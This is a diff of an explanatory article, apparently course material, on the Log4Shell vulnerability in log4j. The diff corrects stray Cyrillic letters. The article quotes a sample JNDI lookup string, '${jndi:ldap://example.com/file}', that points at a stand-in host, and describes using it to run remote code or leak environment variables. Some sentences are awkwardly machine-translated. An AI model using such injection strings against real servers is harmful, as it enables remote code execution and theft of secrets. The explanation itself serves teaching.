@@ -11,7 +11,7 @@ Scandal The scale of the disaster The most serious vulnerability in history The 
 <p>If a Java project used a library <code>log4j</code>, then it could be hacked fairly easily. And given that almost all server software is written in <code>Java</code>the <code>log4j</code>most popular java logger, according to security experts, the vulnerability affected 93% of corporate cloud environments. Including the likes of Amazon AWS, Microsoft Azure, Google Cloud, Cloudflare, iCloud, Minecraft, Steam and many more</p>
 <p>Moreover, the vulnerability affected not only server software, but also many Java applications, as well as hardware manufacturers. For example, Intel published a list of 32 hackable programs: SDKs, server maintenance systems, Linux tools.</p>
 <p>Nvidia also posted a security issue report mentioning DGX servers and NetQ tools. A number of updates were urgently released by Apple and Microsoft.</p>
-<p><span class="text-red">Roughly speaking, one line in the address bar of a student's browser puts the server if this line is eaten by the logger</span> (on many servers, everything is logged <code>HTTP-requestы</code>).</p>
+<p><span class="text-red">Roughly speaking, one line in the address bar of a student's browser puts the server if this line is eaten by the logger</span> (on many servers, everything is logged <code>HTTP-requests</code>).</p>
 <p>After analyzing the code, it turned out that the vulnerability had been sitting in the library since 2013, but they noticed only now. And when they began to dig deeper, they discovered an abyss, the bottom of which is not visible at all.</p>
 <h2>7.3 The most serious vulnerability in history</h2>
 <p>Back in December 2021, the US Cybersecurity and Infrastructure Protection Agency (CISA) <a href="https://www.techradar.com/news/log4j-could-be-the-most-serious-threat-ever-seen-cisa-head-warns" target="_blank">stated</a> that <strong><code>Log4Shell</code>it is one of the most serious vulnerabilities in history</strong> .</p>
@@ -55,7 +55,7 @@ log.debug( <span class="text-green">“User “+</span>user <span class="text-gr
  <li>The object's constructor is called</li>
  <li>Both constructor and static initialization allow malicious class code to be executed</li>
 </ul>
-<p><code>log4j</code>If there is something like in the line that is being logged <code>${jndi:ldap://example.com/file}</code>, then <span class="text-red"><code>log4j</code>it will download data from this <code>URL-address</code>when connecting to the Internet</span> . By entering a string that is logged, an attacker can download and execute malicious code hosted on a public <code>URL-addressе</code>.</p>
-<p>Even if data execution is disabled, an attacker can obtain data, such as secret environment variables, by placing it in a <code>URL-addressе</code>, which will replace it and send it to the attacker's server.</p>
+<p><code>log4j</code>If there is something like in the line that is being logged <code>${jndi:ldap://example.com/file}</code>, then <span class="text-red"><code>log4j</code>it will download data from this <code>URL-address</code>when connecting to the Internet</span> . By entering a string that is logged, an attacker can download and execute malicious code hosted on a public <code>URL-address</code>.</p>
+<p>Even if data execution is disabled, an attacker can obtain data, such as secret environment variables, by placing it in a <code>URL-address</code>, which will replace it and send it to the attacker's server.</p>
 <p>The good news is that <strong>the problem was quickly fixed in the library</strong> .</p>
 <p>The bad news is that <span class="text-red">millions of servers around the world are still running the old version of this library</span> ...</p>
